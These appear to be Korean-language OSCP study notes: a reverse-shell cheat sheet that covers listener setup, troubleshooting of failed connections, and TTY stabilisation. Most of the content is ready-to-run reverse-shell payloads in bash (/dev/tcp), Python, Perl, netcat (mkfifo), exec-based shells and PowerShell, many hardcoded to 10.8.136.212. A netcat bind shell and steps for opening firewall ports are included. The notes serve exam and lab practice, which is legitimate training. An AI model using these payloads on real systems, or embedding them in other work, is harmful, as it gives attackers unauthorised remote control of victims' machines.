```bash
python --version
python2 --version
python3 --version

sudo apt update
sudo apt install python2 python3
```

**핵심**: 반드시 공격자 머신에서 `nc -lvnp 4444`를 먼저 실행한 후, 타겟에서 연결을 시도해야 합니다.

**Connection refused (Errno 111)** 오류는 다음 중 하나입니다:

- 공격자 머신에서 리스너가 실행되지 않음
- IP 주소 또는 포트 번호 오류
- 네트워크 연결 문제 (방화벽/라우팅)

---

## 1️⃣ 공격자 머신에서 리스너 설정

```bash
# 공격자 머신에서 먼저 실행
nc -lvnp 4444

# 옵션 설명:
# -l : listen 모드 (대기)
# -v : verbose (상세 출력)
# -n : DNS 해석 생략 (속도 향상)
# -p : 포트 지정
```

### IP 주소 확인

```bash
# 공격자 머신의 IP 확인
ip a | grep inet
# 또는
ifconfig | grep inet
# VPN 사용시 tun0 인터페이스 확인
ip a show tun0
```

# 포트 연결 테스트

nc -zv 10.10.234.59 4444
-z : Zero-I/O 모드 - 연결만 테스트하고 데이터 전송하지 않음 (포트 스캔용)
-v : Verbose 모드 - 상세한 출력 표시
sh -i >& /dev/tcp/10.8.136.212/4444 0>&1

---

# 리버스쉘 파일 생성 사이트 -> https://www.revshells.com/

```bash
# python interpreter env

# bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.136.212",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

# sh
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.136.212",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")


# bash 환경에서 실행
python3 -c 'import socket,subprocess,os;s=socket.socket();s.bind(("10.8.136.212",4445));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

````bash
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.8.136.212", 4445))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/bash", "-i"])

```

```bash
# 타겟에서 공격자로 핑 테스트
ping -c 4 공격자IP
# 포트 연결 테스트
nc -zv 공격자IP 4444
# 또는 텔넷으로 테스트
telnet 공격자IP 4444
````

## 4️⃣ 대체 리버스 쉘 방법

### 📎 Bash 리버스 쉘

```bash
bash -i >& /dev/tcp/공격자IP/4444 0>&1
```

### 📎 Netcat 리버스 쉘 (전통적 방법)

```bash
# mkfifo를 이용한 방법
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 공격자IP 4444 >/tmp/f
```

### 📎 Perl 리버스 쉘

```bash
perl -e 'use Socket;$i="공격자IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## 5️⃣ TTY 쉘 안정화

### 연결 후 즉시 실행

```bash
# 파이썬으로 PTY 생성
python -c 'import pty; pty.spawn("/bin/bash")'
# 또는
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 환경변수 설정
export TERM=xterm
export SHELL=/bin/bash
```

### 완전한 TTY 만들기

```bash
# 백그라운드로 보내기
Ctrl+Z

# 공격자 터미널에서
stty raw -echo
fg

# 다시 타겟 쉘에서
reset
stty rows 38 cols 116
```

---

## 6️⃣ 네트워크 문제 해결

### 방화벽 확인 및 설정

```bash
# 공격자 머신에서 방화벽 확인
sudo ufw status
sudo iptables -L

# 포트 허용 (필요시)
sudo ufw allow 4444
sudo iptables -I INPUT -p tcp --dport 4444 -j ACCEPT
```

### 포트 사용 중인지 확인

```bash
# 포트 사용 상태 확인
netstat -tlnp | grep 4444
ss -tlnp | grep 4444

# 다른 포트로 시도
nc -lvnp 4445
```

---

## 7️⃣ OSCP 시험 허용 범위 내 도구

### 기본 도구만 사용 (OSCP 허용)

- **nc (netcat)** - 기본 설치
- **python/python3** - 대부분 기본 설치
- **bash** - 기본 쉘
- **perl** - 대부분 설치됨

### 자동화 도구 사용 금지

- msfvenom 생성 페이로드는 사용 가능하지만 meterpreter 금지
- 자동 익스플로잇 도구 금지
- 수동으로 명령어 실행해야 함

---

## 8️⃣ 실전 체크리스트

| 단계 | 확인 사항          | 명령어                                           |
| ---- | ------------------ | ------------------------------------------------ |
| 1    | 공격자 리스너 실행 | `nc -lvnp 4444`                                  |
| 2    | IP 주소 정확성     | `ip a \| grep inet`                              |
| 3    | 타겟 Python 존재   | `which python3`                                  |
| 4    | 네트워크 연결      | `ping 공격자IP`                                  |
| 5    | 포트 연결 테스트   | `nc -zv 공격자IP 4444`                           |
| 6    | 리버스 쉘 실행     | 위 Python 코드                                   |
| 7    | TTY 안정화         | `python -c 'import pty; pty.spawn("/bin/bash")'` |

---

## ⚠️ 주의사항

1. **IP 주소를 실제 공격자 머신 IP로 변경** 필수
2. **리스너를 먼저 실행**한 후 타겟에서 연결 시도
3. **방화벽/NAT 환경**에서는 포트 포워딩 필요할 수 있음
4. **VPN 사용시 tun0 인터페이스 IP** 사용
5. OSCP 시험에서는 **수동 실행만 허용**되므로 자동화 금지

### 🔗 Bash

```bash
# 방법 1: /dev/tcp 사용
bash -i >& /dev/tcp/10.8.136.212/4444 0>&1

# 방법 2: exec 사용
exec 5<>/dev/tcp/10.8.136.212/4444;cat <&5|while read line;do $line 2>&5 >&5;done
```

### 🌊 PowerShell (Windows)

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.8.136.212",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

---

## 🎯 OSCP 허용 범위 내 방법들

### 수동 실행 가능한 도구들:

1. **Python** - 대부분 설치되어 있음
2. **Bash** - 기본 쉘
3. **Perl** - 많은 시스템에 기본 설치
4. **Netcat** - 네트워크 도구
5. **PHP** - 웹 서버 환경에서
6. **Ruby** - 일부 시스템에 설치됨

### 🚫 OSCP에서 금지되는 것들:

- **Meterpreter** 사용
- **자동화된 익스플로잇 도구**
- **GUI 기반 도구**

---

## 🔧 연결 테스트 및 디버깅

### 1️⃣ 기본 연결성 확인

```bash
# 핑 테스트
ping -c 2 10.8.136.212

# 포트 연결 테스트
nc -zv 10.8.136.212 4444
```

### 2️⃣ 다른 포트로 테스트

```bash
# 공격자 머신에서 다른 포트 사용
nc -lvnp 8080

# 타겟에서 연결
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.8.136.212",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### 3️⃣ 바인드 쉘로 방향 변경

```bash
# 타겟에서 바인드 쉘 실행
nc -lvnp 4444 -e /bin/bash

# 공격자에서 연결
nc 타겟IP 4444
```

---

## 📋 언어별 장단점 비교

| 언어       | 장점                    | 단점               | OSCP 추천도 |
| ---------- | ----------------------- | ------------------ | ----------- |
| **Python** | 거의 모든 시스템에 존재 | 없음               | ⭐⭐⭐⭐⭐  |
| **Bash**   | 기본 쉘, 빠름           | /dev/tcp 지원 필요 | ⭐⭐⭐⭐⭐  |
| **Netcat** | 간단, 직관적            | 버전별 차이        | ⭐⭐⭐⭐    |
| **Perl**   | 강력한 기능             | 복잡한 문법        | ⭐⭐⭐      |
| **PHP**    | 웹 환경에서 유용        | PHP 설치 필요      | ⭐⭐⭐      |
| **Ruby**   | 간결한 코드             | Ruby 설치 필요     | ⭐⭐        |

---
